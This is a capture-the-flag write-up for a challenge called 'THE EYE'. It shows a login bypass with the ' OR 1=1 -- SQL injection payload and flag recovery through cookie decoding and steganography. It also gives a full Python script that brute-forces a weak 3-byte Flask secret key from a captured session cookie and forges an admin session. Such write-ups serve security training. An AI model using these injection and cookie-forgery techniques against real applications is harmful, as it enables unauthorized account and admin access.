# THE EYE Writeup

## Stage 1

Guess SQL injection.

Yes! Payload is the calssic `' OR 1=1 --`

After logging in and click getflag, base64 decode the cookie and found the second part of flag is `on_is_just_a_lie__*_*}`

Then what's next? Guessing again... Image!

`exiftool`, `binwalk`, `pngcheck` no suspicious things.

Steg? Yes!

Open stegsolve, switch to `Alpha plane 0` and done.

LoTuX{SQL_injection_is_just_a_lie__*_*}

## Stage 2

Guessing again, we found `robots.txt`

```text
User-agent: *
Disallow: /admin       # This is for THE EYE 2
Disallow: /admin-dev   # This is for THE EYE 2
```

In `admin-dev` we have some source code:

```python
from flask import Flask, session, redirect, render_template
import os

DATABASE = 'EYE.db'

app = Flask(__name__)
app.secret_key = os.urandom(3)

@app.route('/admin')
def admin():
    if not 'username' in session:
        return redirect('/')
    if session['username'] != 'admin':
        return redirect('/')
    return render_template('admin.html')
```

We can bruteforce the secret key. The rest is similiar to `Most Cookies` in PicoCTF.

Need some patience while bruteforcing. A few minutes is needed.

```python
def decode_flask_cookie(secret_key, cookie_str):
    import hashlib
    from itsdangerous import URLSafeTimedSerializer
    from flask.sessions import TaggedJSONSerializer

    salt = "cookie-session"
    serializer = TaggedJSONSerializer()
    signer_kwargs = {"key_derivation": "hmac", "digest_method": hashlib.sha1}
    s = URLSafeTimedSerializer(
        secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs
    )
    return s.loads(cookie_str)


wordlist = []

secret_key_haha = b''

for i in range(256**3):
    # Convert the integer to bytes and add leading zeros if necessary
    wordlist.append(i.to_bytes(3, byteorder='big'))
print("wordlist generated successfully")
for word in wordlist:
    print("Trying "+str(word))
    try:
        res = decode_flask_cookie(
            word, "eyJmbGFnIjoiW1RIRSBFWUUgMV0gb25faXNfanVzdF9hX2xpZV9fKl8qfSIsInVzZXJuYW1lIjoiY3VyaW91cyJ9.ZFbIIQ.ncYuh-QhnRLZJy9QfusHjW02zBY" # This is the session cookie grabbed after login with sql injection and click getflag  
        )
        # except BadSignature:
        	# continue
        print(word)
        print(res)
        secret_key_haha = word # In this challenge is b'\x9d\xdd\x82'
        break
    except:
        continue
print("Found secret_key:"+str(word))
WTF = {"flag":"[THE EYE 1] on_is_just_a_lie__*_*}","username":"admin"}


def encode_flask_cookie(secret_key, cookie_str):
    import hashlib
    from itsdangerous import URLSafeTimedSerializer
    from flask.sessions import TaggedJSONSerializer

    salt = "cookie-session"
    serializer = TaggedJSONSerializer()
    signer_kwargs = {"key_derivation": "hmac", "digest_method": hashlib.sha1}
    s = URLSafeTimedSerializer(
        secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs
    )
    return s.dumps(cookie_str)

print(encode_flask_cookie(secret_key_haha,WTF))
```
